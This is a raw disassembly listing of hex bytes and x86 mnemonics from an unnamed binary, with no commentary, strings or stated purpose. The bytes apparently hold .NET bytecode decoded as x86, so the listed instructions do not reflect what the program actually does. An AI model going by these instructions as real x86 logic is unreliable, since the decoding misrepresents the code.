  4036a9:	0a 28                	or     (%eax),%ch
  4036ab:	78 00                	js     0x4036ad
  4036ad:	00 0a                	add    %cl,(%edx)
  4036af:	73 79                	jae    0x40372a
  4036b1:	00 00                	add    %al,(%eax)
  4036b3:	0a 28                	or     (%eax),%ch
  4036b5:	7a 00                	jp     0x4036b7
  4036b7:	00 0a                	add    %cl,(%edx)
  4036b9:	8c 68 00             	mov    %gs,0x0(%eax)
  4036bc:	00 01                	add    %al,(%ecx)
  4036be:	a2 28 8c 00 00       	mov    %al,0x8c28
  4036c3:	0a 28                	or     (%eax),%ch
  4036c5:	2e 00 00             	add    %al,%cs:(%eax)
  4036c8:	06                   	push   %es
  4036c9:	0a dd                	or     %ch,%bl
  4036cb:	0c 00                	or     $0x0,%al
  4036cd:	00 00                	add    %al,(%eax)
  4036cf:	26 72 e6             	es jb  0x4036b8
  4036d2:	23 00                	and    (%eax),%eax
  4036d4:	70 0a                	jo     0x4036e0
  4036d6:	dd 00                	fldl   (%eax)
  4036d8:	00 00                	add    %al,(%eax)
  4036da:	00 06                	add    %al,(%esi)
  4036dc:	2a 00                	sub    (%eax),%al
  4036de:	00 00                	add    %al,(%eax)
  4036e0:	01 10                	add    %edx,(%eax)
  4036e2:	00 00                	add    %al,(%eax)
  4036e4:	00 00                	add    %al,(%eax)
  4036e6:	00 00                	add    %al,(%eax)
  4036e8:	57                   	push   %edi
  4036e9:	57                   	push   %edi
  4036ea:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  4036ed:	00 00                	add    %al,(%eax)
  4036ef:	01 13                	add    %edx,(%ebx)
  4036f1:	30 03                	xor    %al,(%ebx)
  4036f3:	00 5d 00             	add    %bl,0x0(%ebp)
  4036f6:	00 00                	add    %al,(%eax)
  4036f8:	0c 00                	or     $0x0,%al
  4036fa:	00 11                	add    %dl,(%ecx)
  4036fc:	73 8d                	jae    0x40368b
  4036fe:	00 00                	add    %al,(%eax)
  403700:	0a 28                	or     (%eax),%ch
  403702:	8e 00                	mov    (%eax),%es
  403704:	00 0a                	add    %cl,(%edx)
  403706:	02 6f 1f             	add    0x1f(%edi),%ch
  403709:	00 00                	add    %al,(%eax)
  40370b:	0a 0a                	or     (%edx),%cl
  40370d:	06                   	push   %es
  40370e:	6f                   	outsl  %ds:(%esi),(%dx)
  40370f:	8f 00                	pop    (%eax)
  403711:	00 0a                	add    %cl,(%edx)
  403713:	0a 73 90             	or     -0x70(%ebx),%dh
  403716:	00 00                	add    %al,(%eax)
  403718:	0a 0b                	or     (%ebx),%cl
  40371a:	06                   	push   %es
  40371b:	0c 16                	or     $0x16,%al
  40371d:	0d 38 1c 00 00       	or     $0x1c38,%eax
  403722:	00 08                	add    %cl,(%eax)
  403724:	09 91 13 04 07 12    	or     %edx,0x12070413(%ecx)
  40372a:	04 72                	add    $0x72,%al
  40372c:	f8                   	clc
  40372d:	23 00                	and    (%eax),%eax
  40372f:	70 28                	jo     0x403759
  403731:	91                   	xchg   %eax,%ecx
  403732:	00 00                	add    %al,(%eax)
  403734:	0a 6f 92             	or     -0x6e(%edi),%ch
  403737:	00 00                	add    %al,(%eax)
  403739:	0a 26                	or     (%esi),%ah
  40373b:	09 17                	or     %edx,(%edi)
  40373d:	58                   	pop    %eax
  40373e:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  403743:	32 de                	xor    %dh,%bl
  403745:	07                   	pop    %es
  403746:	6f                   	outsl  %ds:(%esi),(%dx)
  403747:	38 00                	cmp    %al,(%eax)
  403749:	00 0a                	add    %cl,(%edx)
  40374b:	16                   	push   %ss
  40374c:	1f                   	pop    %ds
  40374d:	14 6f                	adc    $0x6f,%al
  40374f:	93                   	xchg   %eax,%ebx
  403750:	00 00                	add    %al,(%eax)
  403752:	0a 6f 94             	or     -0x6c(%edi),%ch
  403755:	00 00                	add    %al,(%eax)
  403757:	0a 2a                	or     (%edx),%ch
  403759:	00 00                	add    %al,(%eax)
  40375b:	00 13                	add    %dl,(%ebx)
  40375d:	30 07                	xor    %al,(%edi)
  40375f:	00 b0 01 00 00 0d    	add    %dh,0xd000001(%eax)
  403765:	00 00                	add    %al,(%eax)
  403767:	11 73 94             	adc    %esi,-0x6c(%ebx)
  40376a:	00 00                	add    %al,(%eax)
  40376c:	06                   	push   %es
  40376d:	25 72 62 21 00       	and    $0x216272,%eax
  403772:	70 6f                	jo     0x4037e3
  403774:	7f 00                	jg     0x403776
  403776:	00 06                	add    %al,(%esi)
  403778:	72 fe                	jb     0x403778
  40377a:	23 00                	and    (%eax),%eax
  40377c:	70 6f                	jo     0x4037ed
  40377e:	8c 00                	mov    %es,(%eax)
  403780:	00 06                	add    %al,(%esi)
  403782:	25 72 14 24 00       	and    $0x241472,%eax
  403787:	70 6f                	jo     0x4037f8
  403789:	7f 00                	jg     0x40378b
  40378b:	00 06                	add    %al,(%esi)
  40378d:	7e 10                	jle    0x40379f
  40378f:	00 00                	add    %al,(%eax)
  403791:	04 6f                	add    $0x6f,%al
  403793:	8c 00                	mov    %es,(%eax)
  403795:	00 06                	add    %al,(%esi)
  403797:	25 72 1e 24 00       	and    $0x241e72,%eax
  40379c:	70 6f                	jo     0x40380d
  40379e:	7f 00                	jg     0x4037a0
  4037a0:	00 06                	add    %al,(%esi)
  4037a2:	28 89 00 00 0a 6f    	sub    %cl,0x6f0a0000(%ecx)
  4037a8:	38 00                	cmp    %al,(%eax)
  4037aa:	00 0a                	add    %cl,(%edx)
  4037ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4037ad:	8c 00                	mov    %es,(%eax)
  4037af:	00 06                	add    %al,(%esi)
  4037b1:	25 72 28 24 00       	and    $0x242872,%eax
  4037b6:	70 6f                	jo     0x403827
  4037b8:	7f 00                	jg     0x4037ba
  4037ba:	00 06                	add    %al,(%esi)
  4037bc:	73 7b                	jae    0x403839
  4037be:	00 00                	add    %al,(%eax)
  4037c0:	0a 28                	or     (%eax),%ch
  4037c2:	7c 00                	jl     0x4037c4
  4037c4:	00 0a                	add    %cl,(%edx)
  4037c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4037c7:	38 00                	cmp    %al,(%eax)
  4037c9:	00 0a                	add    %cl,(%edx)
  4037cb:	72 2e                	jb     0x4037fb
  4037cd:	24 00                	and    $0x0,%al
  4037cf:	70 14                	jo     0x4037e5
  4037d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4037d2:	95                   	xchg   %eax,%ebp
  4037d3:	00 00                	add    %al,(%eax)
  4037d5:	0a 72 42             	or     0x42(%edx),%dh
  4037d8:	24 00                	and    $0x0,%al
  4037da:	70 28                	jo     0x403804
  4037dc:	96                   	xchg   %eax,%esi
  4037dd:	00 00                	add    %al,(%eax)
  4037df:	0a 0a                	or     (%edx),%cl
  4037e1:	12 00                	adc    (%eax),%al
  4037e3:	28 97 00 00 0a 72    	sub    %dl,0x720a0000(%edi)
  4037e9:	46                   	inc    %esi
  4037ea:	24 00                	and    $0x0,%al
  4037ec:	70 72                	jo     0x403860
  4037ee:	50                   	push   %eax
  4037ef:	24 00                	and    $0x0,%al
  4037f1:	70 6f                	jo     0x403862
  4037f3:	95                   	xchg   %eax,%ebp
  4037f4:	00 00                	add    %al,(%eax)
  4037f6:	0a 72 5c             	or     0x5c(%edx),%dh
  4037f9:	24 00                	and    $0x0,%al
  4037fb:	70 72                	jo     0x40386f
  4037fd:	68 24 00 70 6f       	push   $0x6f700024
  403802:	95                   	xchg   %eax,%ebp
  403803:	00 00                	add    %al,(%eax)
  403805:	0a 28                	or     (%eax),%ch
  403807:	68 00 00 0a 6f       	push   $0x6f0a0000
  40380c:	8c 00                	mov    %es,(%eax)
  40380e:	00 06                	add    %al,(%esi)
  403810:	25 72 74 24 00       	and    $0x247472,%eax
  403815:	70 6f                	jo     0x403886
  403817:	7f 00                	jg     0x403819
  403819:	00 06                	add    %al,(%esi)
  40381b:	28 98 00 00 0a 6f    	sub    %bl,0x6f0a0000(%eax)
  403821:	8c 00                	mov    %es,(%eax)
  403823:	00 06                	add    %al,(%esi)
  403825:	25 72 7e 24 00       	and    $0x247e72,%eax
  40382a:	70 6f                	jo     0x40389b
  40382c:	7f 00                	jg     0x40382e
  40382e:	00 06                	add    %al,(%esi)
  403830:	7e 03                	jle    0x403835
  403832:	00 00                	add    %al,(%eax)
  403834:	04 6f                	add    $0x6f,%al
  403836:	8c 00                	mov    %es,(%eax)
  403838:	00 06                	add    %al,(%esi)
  40383a:	25 72 8e 24 00       	and    $0x248e72,%eax
  40383f:	70 6f                	jo     0x4038b0
  403841:	7f 00                	jg     0x403843
  403843:	00 06                	add    %al,(%esi)
  403845:	28 30                	sub    %dh,(%eax)
  403847:	00 00                	add    %al,(%eax)
  403849:	06                   	push   %es
  40384a:	0a 12                	or     (%edx),%dl
  40384c:	00 28                	add    %ch,(%eax)
  40384e:	97                   	xchg   %eax,%edi
  40384f:	00 00                	add    %al,(%eax)
  403851:	0a 6f 7d             	or     0x7d(%edi),%ch
  403854:	00 00                	add    %al,(%eax)
  403856:	0a 72 9a             	or     -0x66(%edx),%dh
  403859:	24 00                	and    $0x0,%al
  40385b:	70 72                	jo     0x4038cf
  40385d:	8e 24 00             	mov    (%eax,%eax,1),%fs
  403860:	70 6f                	jo     0x4038d1
  403862:	95                   	xchg   %eax,%ebp
  403863:	00 00                	add    %al,(%eax)
  403865:	0a 72 a4             	or     -0x5c(%edx),%dh
  403868:	24 00                	and    $0x0,%al
  40386a:	70 72                	jo     0x4038de
  40386c:	1e                   	push   %ds
  40386d:	24 00                	and    $0x0,%al
  40386f:	70 6f                	jo     0x4038e0
  403871:	95                   	xchg   %eax,%ebp
  403872:	00 00                	add    %al,(%eax)
  403874:	0a 6f 8c             	or     -0x74(%edi),%ch
  403877:	00 00                	add    %al,(%eax)
  403879:	06                   	push   %es
  40387a:	25 72 b0 24 00       	and    $0x24b072,%eax
  40387f:	70 6f                	jo     0x4038f0
  403881:	7f 00                	jg     0x403883
  403883:	00 06                	add    %al,(%esi)
  403885:	28 35 00 00 06 6f    	sub    %dh,0x6f060000
  40388b:	8c 00                	mov    %es,(%eax)
  40388d:	00 06                	add    %al,(%esi)
  40388f:	25 72 c8 24 00       	and    $0x24c872,%eax
  403894:	70 6f                	jo     0x403905
  403896:	7f 00                	jg     0x403898
  403898:	00 06                	add    %al,(%esi)
  40389a:	7e 0e                	jle    0x4038aa
  40389c:	00 00                	add    %al,(%eax)
  40389e:	04 6f                	add    $0x6f,%al
  4038a0:	8c 00                	mov    %es,(%eax)
  4038a2:	00 06                	add    %al,(%esi)
  4038a4:	25 72 da 24 00       	and    $0x24da72,%eax
  4038a9:	70 6f                	jo     0x40391a
  4038ab:	7f 00                	jg     0x4038ad
  4038ad:	00 06                	add    %al,(%esi)
  4038af:	28 32                	sub    %dh,(%edx)
  4038b1:	00 00                	add    %al,(%eax)
  4038b3:	06                   	push   %es
  4038b4:	6f                   	outsl  %ds:(%esi),(%dx)
  4038b5:	8c 00                	mov    %es,(%eax)
  4038b7:	00 06                	add    %al,(%esi)
  4038b9:	25 72 ee 24 00       	and    $0x24ee72,%eax
  4038be:	70 6f                	jo     0x40392f
  4038c0:	7f 00                	jg     0x4038c2
  4038c2:	00 06                	add    %al,(%esi)
  4038c4:	28 98 00 00 0a 73    	sub    %bl,0x730a0000(%eax)
  4038ca:	54                   	push   %esp
  4038cb:	00 00                	add    %al,(%eax)
  4038cd:	0a 28                	or     (%eax),%ch
  4038cf:	99                   	cltd
  4038d0:	00 00                	add    %al,(%eax)
  4038d2:	0a 0b                	or     (%ebx),%cl
  4038d4:	12 01                	adc    (%ecx),%al
  4038d6:	28 9a 00 00 0a 0b    	sub    %bl,0xb0a0000(%edx)
  4038dc:	12 01                	adc    (%ecx),%al
  4038de:	28 9b 00 00 0a 6f    	sub    %bl,0x6f0a0000(%ebx)
  4038e4:	8c 00                	mov    %es,(%eax)
  4038e6:	00 06                	add    %al,(%esi)
  4038e8:	25 72 02 25 00       	and    $0x250272,%eax
  4038ed:	70 6f                	jo     0x40395e
  4038ef:	7f 00                	jg     0x4038f1
  4038f1:	00 06                	add    %al,(%esi)
  4038f3:	72 67                	jb     0x40395c
  4038f5:	03 00                	add    (%eax),%eax
  4038f7:	70 6f                	jo     0x403968
  4038f9:	8c 00                	mov    %es,(%eax)
  4038fb:	00 06                	add    %al,(%esi)
  4038fd:	25 72 0c 25 00       	and    $0x250c72,%eax
  403902:	70 6f                	jo     0x403973
  403904:	7f 00                	jg     0x403906
  403906:	00 06                	add    %al,(%esi)
  403908:	7e 12                	jle    0x40391c
  40390a:	00 00                	add    %al,(%eax)
  40390c:	04 6f                	add    $0x6f,%al
  40390e:	8c 00                	mov    %es,(%eax)
  403910:	00 06                	add    %al,(%esi)
  403912:	6f                   	outsl  %ds:(%esi),(%dx)
  403913:	89 00                	mov    %eax,(%eax)
  403915:	00 06                	add    %al,(%esi)
  403917:	2a 1b                	sub    (%ebx),%bl
  403919:	30 02                	xor    %al,(%edx)
  40391b:	00 5b 00             	add    %bl,0x0(%ebx)
  40391e:	00 00                	add    %al,(%eax)
  403920:	00 00                	add    %al,(%eax)
  403922:	00 00                	add    %al,(%eax)
  403924:	7e 0f                	jle    0x403935
  403926:	00 00                	add    %al,(%eax)
  403928:	04 28                	add    $0x28,%al
  40392a:	17                   	pop    %ss
  40392b:	00 00                	add    %al,(%eax)
  40392d:	0a 39                	or     (%ecx),%bh
  40392f:	0f 00 00             	sldt   (%eax)
  403932:	00 28                	add    %ch,(%eax)
  403934:	30 00                	xor    %al,(%eax)
  403936:	00 06                	add    %al,(%esi)
  403938:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  40393e:	40                   	inc    %eax
  40393f:	00 00                	add    %al,(%eax)
  403941:	06                   	push   %es
  403942:	28 37                	sub    %dh,(%edi)
  403944:	00 00                	add    %al,(%eax)
  403946:	06                   	push   %es
  403947:	28 08                	sub    %cl,(%eax)
  403949:	00 00                	add    %al,(%eax)
  40394b:	06                   	push   %es
  40394c:	25 3a 06 00 00       	and    $0x63a,%eax
  403951:	00 26                	add    %ah,(%esi)
  403953:	38 05 00 00 00 6f    	cmp    %al,0x6f000000
  403959:	9f                   	lahf
  40395a:	00 00                	add    %al,(%eax)
  40395c:	0a 28                	or     (%eax),%ch
  40395e:	06                   	push   %es
  40395f:	00 00                	add    %al,(%eax)
  403961:	06                   	push   %es
  403962:	25 3a 06 00 00       	and    $0x63a,%eax
  403967:	00 26                	add    %ah,(%esi)
  403969:	38 05 00 00 00 28    	cmp    %al,0x28000000
  40396f:	a0 00 00 0a dd       	mov    0xdd0a0000,%al
  403974:	06                   	push   %es
  403975:	00 00                	add    %al,(%eax)
  403977:	00 26                	add    %ah,(%esi)
  403979:	dd 00                	fldl   (%eax)
  40397b:	00 00                	add    %al,(%eax)
  40397d:	00 2a                	add    %ch,(%edx)
  40397f:	00 01                	add    %al,(%ecx)
  403981:	10 00                	adc    %al,(%eax)
  403983:	00 00                	add    %al,(%eax)
  403985:	00 00                	add    %al,(%eax)
  403987:	00 54 54 00          	add    %dl,0x0(%esp,%edx,2)
  40398b:	06                   	push   %es
  40398c:	01 00                	add    %eax,(%eax)
  40398e:	00 01                	add    %al,(%ecx)
  403990:	1b 30                	sbb    (%eax),%esi
  403992:	03 00                	add    (%eax),%eax
  403994:	b8 00 00 00 0e       	mov    $0xe000000,%eax
  403999:	00 00                	add    %al,(%eax)
  40399b:	11 72 18             	adc    %esi,0x18(%edx)
  40399e:	25 00 70 28 8a       	and    $0x8a287000,%eax
  4039a3:	00 00                	add    %al,(%eax)
  4039a5:	0a 72 1e             	or     0x1e(%edx),%dh
  4039a8:	25 00 70 28 68       	and    $0x68287000,%eax
  4039ad:	00 00                	add    %al,(%eax)
  4039af:	0a 72 4a             	or     0x4a(%edx),%dh
  4039b2:	25 00 70 73 a1       	and    $0xa1737000,%eax
  4039b7:	00 00                	add    %al,(%eax)
  4039b9:	0a 0a                	or     (%edx),%cl
  4039bb:	73 a2                	jae    0x40395f
  4039bd:	00 00                	add    %al,(%eax)
  4039bf:	0a 0b                	or     (%ebx),%cl
  4039c1:	06                   	push   %es
  4039c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4039c3:	80 00 00             	addb   $0x0,(%eax)
  4039c6:	0a 6f 81             	or     -0x7f(%edi),%ch
  4039c9:	00 00                	add    %al,(%eax)
  4039cb:	0a 0c 38             	or     (%eax,%edi,1),%cl
  4039ce:	1d 00 00 00 08       	sbb    $0x8000000,%eax
  4039d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4039d4:	82 00 00             	addb   $0x0,(%eax)
  4039d7:	0a 0d 07 09 72 88    	or     0x88720907,%cl
  4039dd:	25 00 70 6f 83       	and    $0x836f7000,%eax
  4039e2:	00 00                	add    %al,(%eax)
  4039e4:	0a 6f 38             	or     0x38(%edi),%ch
  4039e7:	00 00                	add    %al,(%eax)
  4039e9:	0a 6f a3             	or     -0x5d(%edi),%ch
  4039ec:	00 00                	add    %al,(%eax)
  4039ee:	0a 08                	or     (%eax),%cl
  4039f0:	6f                   	outsl  %ds:(%esi),(%dx)
  4039f1:	85 00                	test   %eax,(%eax)
  4039f3:	00 0a                	add    %cl,(%edx)
  4039f5:	2d db dd 0d 00       	sub    $0xddddb,%eax
  4039fa:	00 00                	add    %al,(%eax)
  4039fc:	08 39                	or     %bh,(%ecx)
  4039fe:	06                   	push   %es
  4039ff:	00 00                	add    %al,(%eax)
  403a01:	00 08                	add    %cl,(%eax)
  403a03:	6f                   	outsl  %ds:(%esi),(%dx)
  403a04:	33 00                	xor    (%eax),%eax
  403a06:	00 0a                	add    %cl,(%edx)
  403a08:	dc 07                	faddl  (%edi)
  403a0a:	6f                   	outsl  %ds:(%esi),(%dx)
  403a0b:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403a0c:	00 00                	add    %al,(%eax)
  403a0e:	0a 3a                	or     (%edx),%bh
  403a10:	0c 00                	or     $0x0,%al
  403a12:	00 00                	add    %al,(%eax)
  403a14:	72 a0                	jb     0x4039b6
  403a16:	25 00 70 13 04       	and    $0x4137000,%eax
  403a1b:	dd 31                	fnsave (%ecx)
  403a1d:	00 00                	add    %al,(%eax)
  403a1f:	00 72 a8             	add    %dh,-0x58(%edx)
  403a22:	25 00 70 07 6f       	and    $0x6f077000,%eax
  403a27:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403a28:	00 00                	add    %al,(%eax)
  403a2a:	0a 28                	or     (%eax),%ch
  403a2c:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403a2d:	00 00                	add    %al,(%eax)
  403a2f:	0a 13                	or     (%ebx),%dl
  403a31:	04 dd                	add    $0xdd,%al
  403a33:	1a 00                	sbb    (%eax),%al
  403a35:	00 00                	add    %al,(%eax)
  403a37:	06                   	push   %es
  403a38:	39 06                	cmp    %eax,(%esi)
  403a3a:	00 00                	add    %al,(%eax)
  403a3c:	00 06                	add    %al,(%esi)
  403a3e:	6f                   	outsl  %ds:(%esi),(%dx)
  403a3f:	33 00                	xor    (%eax),%eax
  403a41:	00 0a                	add    %cl,(%edx)
  403a43:	dc 26                	fsubl  (%esi)
  403a45:	72 a0                	jb     0x4039e7
  403a47:	25 00 70 13 04       	and    $0x4137000,%eax
  403a4c:	dd 00                	fldl   (%eax)
  403a4e:	00 00                	add    %al,(%eax)
  403a50:	00 11                	add    %dl,(%ecx)
  403a52:	04 2a                	add    $0x2a,%al
  403a54:	01 28                	add    %ebp,(%eax)
  403a56:	00 00                	add    %al,(%eax)
  403a58:	02 00                	add    (%eax),%al
  403a5a:	31 00                	xor    %eax,(%eax)
  403a5c:	2f                   	das
  403a5d:	60                   	pusha
  403a5e:	00 0d 00 00 00 00    	add    %cl,0x0
  403a64:	02 00                	add    (%eax),%al
  403a66:	1f                   	pop    %ds
  403a67:	00 7c 9b 00          	add    %bh,0x0(%ebx,%ebx,4)
  403a6b:	0d 00 00 00 00       	or     $0x0,%eax
  403a70:	00 00                	add    %al,(%eax)
  403a72:	00 00                	add    %al,(%eax)
  403a74:	a8 a8                	test   $0xa8,%al
  403a76:	00 0d 01 00 00 01    	add    %cl,0x1000001
  403a7c:	13 30                	adc    (%eax),%esi
  403a7e:	02 00                	add    (%eax),%al
  403a80:	39 00                	cmp    %eax,(%eax)
  403a82:	00 00                	add    %al,(%eax)
  403a84:	0f 00 00             	sldt   (%eax)
  403a87:	11 28                	adc    %ebp,(%eax)
  403a89:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403a8a:	00 00                	add    %al,(%eax)
  403a8c:	0a 0a                	or     (%edx),%cl
  403a8e:	16                   	push   %ss
  403a8f:	0b 38                	or     (%eax),%edi
  403a91:	24 00                	and    $0x0,%al
  403a93:	00 00                	add    %al,(%eax)
  403a95:	06                   	push   %es
  403a96:	07                   	pop    %es
  403a97:	a3 0a 00 00 01       	mov    %eax,0x100000a
  403a9c:	0c 08                	or     $0x8,%al
  403a9e:	6f                   	outsl  %ds:(%esi),(%dx)
  403a9f:	a8 00                	test   $0x0,%al
  403aa1:	00 0a                	add    %cl,(%edx)
  403aa3:	02 6f a9             	add    -0x57(%edi),%ch
  403aa6:	00 00                	add    %al,(%eax)
  403aa8:	0a 28                	or     (%eax),%ch
  403aaa:	aa                   	stos   %al,%es:(%edi)
  403aab:	00 00                	add    %al,(%eax)
  403aad:	0a 39                	or     (%ecx),%bh
  403aaf:	02 00                	add    (%eax),%al
  403ab1:	00 00                	add    %al,(%eax)
  403ab3:	08 2a                	or     %ch,(%edx)
  403ab5:	07                   	pop    %es
  403ab6:	17                   	pop    %ss
  403ab7:	58                   	pop    %eax
  403ab8:	0b 07                	or     (%edi),%eax
  403aba:	06                   	push   %es
  403abb:	8e 69 32             	mov    0x32(%ecx),%gs
  403abe:	d6                   	salc
  403abf:	14 2a                	adc    $0x2a,%al
  403ac1:	00 00                	add    %al,(%eax)
  403ac3:	00 1b                	add    %bl,(%ebx)
  403ac5:	30 01                	xor    %al,(%ecx)
  403ac7:	00 17                	add    %dl,(%edi)
  403ac9:	00 00                	add    %al,(%eax)
  403acb:	00 00                	add    %al,(%eax)
  403acd:	00 00                	add    %al,(%eax)
  403acf:	00 20                	add    %ah,(%eax)
  403ad1:	03 00                	add    (%eax),%eax
  403ad3:	00 80 28 3c 00 00    	add    %al,0x3c28(%eax)
  403ad9:	06                   	push   %es
  403ada:	26 dd 06             	fldl   %es:(%esi)
  403add:	00 00                	add    %al,(%eax)
  403adf:	00 26                	add    %ah,(%esi)
  403ae1:	dd 00                	fldl   (%eax)
  403ae3:	00 00                	add    %al,(%eax)
  403ae5:	00 2a                	add    %ch,(%edx)
  403ae7:	00 01                	add    %al,(%ecx)
  403ae9:	10 00                	adc    %al,(%eax)
  403aeb:	00 00                	add    %al,(%eax)
  403aed:	00 00                	add    %al,(%eax)
  403aef:	00 10                	add    %dl,(%eax)
  403af1:	10 00                	adc    %al,(%eax)
  403af3:	06                   	push   %es
  403af4:	01 00                	add    %eax,(%eax)
  403af6:	00 01                	add    %al,(%ecx)
  403af8:	1b 30                	sbb    (%eax),%esi
  403afa:	03 00                	add    (%eax),%eax
  403afc:	40                   	inc    %eax
  403afd:	00 00                	add    %al,(%eax)
  403aff:	00 10                	add    %dl,(%eax)
  403b01:	00 00                	add    %al,(%eax)
  403b03:	11 20                	adc    %esp,(%eax)
  403b05:	00 01                	add    %al,(%ecx)
  403b07:	00 00                	add    %al,(%eax)
  403b09:	73 ab                	jae    0x403ab6
  403b0b:	00 00                	add    %al,(%eax)
  403b0d:	0a 0a                	or     (%edx),%cl
  403b0f:	28 38                	sub    %bh,(%eax)
  403b11:	00 00                	add    %al,(%eax)
  403b13:	06                   	push   %es
  403b14:	06                   	push   %es
  403b15:	20 00                	and    %al,(%eax)
  403b17:	01 00                	add    %eax,(%eax)
  403b19:	00 28                	add    %ch,(%eax)
  403b1b:	39 00                	cmp    %eax,(%eax)
  403b1d:	00 06                	add    %al,(%esi)
  403b1f:	16                   	push   %ss
  403b20:	3e 0c 00             	ds or  $0x0,%al
  403b23:	00 00                	add    %al,(%eax)
  403b25:	06                   	push   %es
  403b26:	6f                   	outsl  %ds:(%esi),(%dx)
  403b27:	38 00                	cmp    %al,(%eax)
  403b29:	00 0a                	add    %cl,(%edx)
  403b2b:	0b dd                	or     %ebp,%ebx
  403b2d:	11 00                	adc    %eax,(%eax)
  403b2f:	00 00                	add    %al,(%eax)
  403b31:	dd 06                	fldl   (%esi)
  403b33:	00 00                	add    %al,(%eax)
  403b35:	00 26                	add    %ah,(%esi)
  403b37:	dd 00                	fldl   (%eax)
  403b39:	00 00                	add    %al,(%eax)
  403b3b:	00 72 67             	add    %dh,0x67(%edx)
  403b3e:	03 00                	add    (%eax),%eax
  403b40:	70 2a                	jo     0x403b6c
  403b42:	07                   	pop    %es
  403b43:	2a 01                	sub    (%ecx),%al
  403b45:	10 00                	adc    %al,(%eax)
  403b47:	00 00                	add    %al,(%eax)
  403b49:	00 00                	add    %al,(%eax)
  403b4b:	00 32                	add    %dh,(%edx)
  403b4d:	32 00                	xor    (%eax),%al
  403b4f:	06                   	push   %es
  403b50:	01 00                	add    %eax,(%eax)
  403b52:	00 01                	add    %al,(%ecx)
  403b54:	13 30                	adc    (%eax),%esi
  403b56:	03 00                	add    (%eax),%eax
  403b58:	14 00                	adc    $0x0,%al
  403b5a:	00 00                	add    %al,(%eax)
  403b5c:	02 00                	add    (%eax),%al
  403b5e:	00 11                	add    %dl,(%ecx)
  403b60:	16                   	push   %ss
  403b61:	7e 08                	jle    0x403b6b
  403b63:	00 00                	add    %al,(%eax)
  403b65:	04 12                	add    $0x12,%al
  403b67:	00 73 ac             	add    %dh,-0x54(%ebx)
  403b6a:	00 00                	add    %al,(%eax)
  403b6c:	0a 80 1e 00 00 04    	or     0x400001e(%eax),%al
  403b72:	06                   	push   %es
  403b73:	2a 1b                	sub    (%ebx),%bl
  403b75:	30 03                	xor    %al,(%ebx)
  403b77:	00 2a                	add    %ch,(%edx)
  403b79:	00 00                	add    %al,(%eax)
  403b7b:	00 00                	add    %al,(%eax)
  403b7d:	00 00                	add    %al,(%eax)
  403b7f:	00 14 fe             	add    %dl,(%esi,%edi,8)
  403b82:	06                   	push   %es
  403b83:	3e 00 00             	add    %al,%ds:(%eax)
  403b86:	06                   	push   %es
  403b87:	73 ae                	jae    0x403b37
  403b89:	00 00                	add    %al,(%eax)
  403b8b:	0a 28                	or     (%eax),%ch
  403b8d:	af                   	scas   %es:(%edi),%eax
  403b8e:	00 00                	add    %al,(%eax)
  403b90:	0a 28                	or     (%eax),%ch
  403b92:	b0 00                	mov    $0x0,%al
  403b94:	00 0a                	add    %cl,(%edx)
  403b96:	17                   	pop    %ss
  403b97:	16                   	push   %ss
  403b98:	16                   	push   %ss
  403b99:	28 3d 00 00 06 dd    	sub    %bh,0xdd060000
  403b9f:	06                   	push   %es
  403ba0:	00 00                	add    %al,(%eax)
  403ba2:	00 26                	add    %ah,(%esi)
  403ba4:	dd 00                	fldl   (%eax)
  403ba6:	00 00                	add    %al,(%eax)
  403ba8:	00 2a                	add    %ch,(%edx)
  403baa:	00 00                	add    %al,(%eax)
  403bac:	01 10                	add    %edx,(%eax)
  403bae:	00 00                	add    %al,(%eax)
  403bb0:	00 00                	add    %al,(%eax)
  403bb2:	00 00                	add    %al,(%eax)
  403bb4:	23 23                	and    (%ebx),%esp
  403bb6:	00 06                	add    %al,(%esi)
  403bb8:	01 00                	add    %eax,(%eax)
  403bba:	00 01                	add    %al,(%ecx)
  403bbc:	1b 30                	sbb    (%eax),%esi
  403bbe:	03 00                	add    (%eax),%eax
  403bc0:	1b 00                	sbb    (%eax),%eax
  403bc2:	00 00                	add    %al,(%eax)
  403bc4:	00 00                	add    %al,(%eax)
  403bc6:	00 00                	add    %al,(%eax)
  403bc8:	16                   	push   %ss
  403bc9:	16                   	push   %ss
  403bca:	16                   	push   %ss
  403bcb:	28 3d 00 00 06 dd    	sub    %bh,0xdd060000
  403bd1:	0d 00 00 00 26       	or     $0x26000000,%eax
  403bd6:	20 a0 86 01 00 28    	and    %ah,0x28000186(%eax)
  403bdc:	14 00                	adc    $0x0,%al
  403bde:	00 0a                	add    %cl,(%edx)
  403be0:	2b f4                	sub    %esp,%esi
  403be2:	2a 00                	sub    (%eax),%al
  403be4:	01 10                	add    %edx,(%eax)
  403be6:	00 00                	add    %al,(%eax)
  403be8:	00 00                	add    %al,(%eax)
  403bea:	00 00                	add    %al,(%eax)
  403bec:	0d 0d 00 0d 01       	or     $0x10d000d,%eax
  403bf1:	00 00                	add    %al,(%eax)
  403bf3:	01 1b                	add    %ebx,(%ebx)
  403bf5:	30 04 00             	xor    %al,(%eax,%eax,1)
  403bf8:	41                   	inc    %ecx
  403bf9:	00 00                	add    %al,(%eax)
  403bfb:	00 11                	add    %dl,(%ecx)
  403bfd:	00 00                	add    %al,(%eax)
  403bff:	11 7e 65             	adc    %edi,0x65(%esi)
  403c02:	00 00                	add    %al,(%eax)
  403c04:	0a 7e 23             	or     0x23(%esi),%bh
  403c07:	00 00                	add    %al,(%eax)
  403c09:	04 18                	add    $0x18,%al
  403c0b:	6f                   	outsl  %ds:(%esi),(%dx)
  403c0c:	b1 00                	mov    $0x0,%cl
  403c0e:	00 0a                	add    %cl,(%edx)
  403c10:	0a 06                	or     (%esi),%al
  403c12:	02 03                	add    (%ebx),%al
  403c14:	19 6f b2             	sbb    %ebp,-0x4e(%edi)
  403c17:	00 00                	add    %al,(%eax)
  403c19:	0a 17                	or     (%edi),%dl
  403c1b:	0b dd                	or     %ebp,%ebx
  403c1d:	1e                   	push   %ds
  403c1e:	00 00                	add    %al,(%eax)
  403c20:	00 06                	add    %al,(%esi)
